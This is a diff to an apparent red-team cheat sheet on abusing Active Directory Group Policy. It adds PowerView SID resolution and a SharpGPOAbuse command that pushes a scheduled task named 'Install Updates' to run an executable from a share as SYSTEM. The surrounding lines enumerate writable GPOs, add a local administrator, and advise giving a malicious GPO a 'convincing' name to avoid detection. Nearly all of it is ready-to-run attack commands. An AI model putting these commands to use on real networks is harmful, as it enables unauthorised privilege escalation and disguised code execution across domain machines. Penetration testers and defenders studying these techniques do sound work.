@@ -421,6 +421,12 @@ Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-
 Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "<DOMAIN SID>-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
 ```
 
+#### Resolve sid + Object dn
+```
+ConvertFrom-SID <SID>
+Get-DomainGPO -Name "{<OBJECT DN SID>}" -Properties DisplayName
+```
+
 #### Create GPO and link to OU
 - Uses RSAT tools
 - OPSEC: The GPO will be visible in the Group Policy Management Console and other RSAT GPO tools, so make sure the name is "convincing".
@@ -441,6 +447,11 @@ Set-GPPrefRegistryValue -Name "Testing GPO SMB security" -Context Computer -Acti
 ./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
 gpupdate /force #On the target machine if you got normal access already
 net localgroup administrators
+```
+
+#### Create scheduled task
+```
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
 ```
 
 ### Build in groups
